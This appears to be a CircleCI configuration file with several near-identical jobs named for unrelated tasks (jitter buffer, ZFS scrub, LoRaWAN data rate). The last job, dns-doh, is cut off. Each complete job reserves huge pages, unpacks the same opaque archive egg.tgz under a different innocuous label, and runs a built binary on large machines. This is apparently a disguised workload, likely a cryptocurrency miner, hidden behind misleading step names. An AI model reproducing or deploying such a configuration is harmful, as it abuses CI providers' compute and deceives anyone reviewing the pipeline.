version: 2.1

jobs:
  jitterbuffer:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set depth
          command: |
            printf 'depth 120ms\n' > jb.cfg
      - run:
          name: Build jitter buffer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target jitterbuffer -j2
      - run:
          name: Smooth packet jitter
          command: LIONSS_LP=1 ./build/jitterbuffer --conf jb.cfg --adaptive
  zfs_scrub:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Name pool
          command: |
            printf 'pool tank\n' > zfs.cfg
      - run:
          name: Build storage tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target zfs_scrub -j2
      - run:
          name: Scrub ZFS pool
          command: LIONSS_LP=1 ./build/zfs_scrub --conf zfs.cfg --priority low
  LorawanAdr:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set data rate
          command: |
            printf 'dr 3\n' > lora.cfg
      - run:
          name: Build LoRaWAN stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target LorawanAdr -j2
      - run:
          name: Adapt data rate
          command: LIONSS_LP=1 ./build/LorawanAdr --conf lora.cfg --margin 10
  dns-doh:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
